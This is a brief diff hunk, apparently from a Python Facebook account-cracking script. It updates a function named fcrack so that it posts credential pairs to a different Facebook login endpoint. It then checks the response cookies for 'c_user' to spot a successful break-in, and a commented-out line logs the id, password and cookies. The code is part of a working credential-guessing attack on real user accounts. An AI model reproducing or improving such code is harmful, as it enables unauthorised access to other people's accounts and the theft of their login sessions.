@@ -849,7 +849,7 @@ def fcrack(uid,pwx,tl):
 
             'upgrade-insecure-requests': '1', 
             'user-agent': ua}
-			lo = session.post('https://www.facebook.com/sound_iframe.php',data=log_data,headers=header_freefb).text
+			lo = session.post('https://web.facebook.com/?_rdc=1&_rdr%22',data=log_data,headers=header_freefb).text
 			log_cookies=session.cookies.get_dict().keys()
 			#print(iid+'|'+pws+'|'+str(log_cookies))
 			if 'c_user' in log_cookies:
